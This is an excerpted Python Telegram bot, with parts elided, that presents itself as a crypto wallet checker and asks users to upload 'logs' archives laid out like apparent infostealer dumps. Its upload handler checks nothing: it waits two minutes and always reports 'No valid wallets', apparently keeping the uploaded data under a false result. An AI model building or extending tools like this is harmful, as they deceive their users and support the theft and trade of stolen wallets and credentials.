...
def handle_text(message):
    ...
    bot.send_message(message.chat.id,f"👋 _Hi_, `{message.chat.first_name}`.* Here you can check 👛 Сrypto Wallets.\nTo use the bot,* _set it up firts_ *in the ⚙️ Settings tab.*",reply_markup=inline_keyboard,parse_mode="Markdown")
...
def callback_handler(call):
    if call.data == 'checker':
        ...
        inline_keyboard.add(button1)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              text='Enter new path. Example: `${log}/Wallets`.',reply_markup=inline_keyboard,parse_mode="Markdown")
        ...
        if str(chat_id) not in str(data):
            ...
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text='Path to 👛 Wallet:  `${log}/Wallet` ', reply_markup=inline_keyboard,parse_mode="Markdown")
        else:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text=f'Path to wallet: `{data[str(chat_id)]}` ', reply_markup=inline_keyboard,parse_mode="Markdown")
    elif call.data == 'upload':
        inline_keyboard = types.InlineKeyboardMarkup()
        button1 = types.InlineKeyboardButton('❌ Cancel', callback_data='checker')
        inline_keyboard.add(button1)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              text='📎 Upload logs in zip/rar (log in archive must be folder)',parse_mode="Markdown",reply_markup=inline_keyboard)
...
def handle_document(message):
    ...
    z = bot.send_message(message.chat.id, f'✅ Started checking logs in `{message.document.file_name}` ...',parse_mode="Markdown")
    time.sleep(120)
    bot.edit_message_text(chat_id=message.chat.id, message_id=z.message_id,text=f"_❌ No valid wallets in_ `{message.document.file_name}`",reply_markup=inline_keyboard,parse_mode="Markdown")
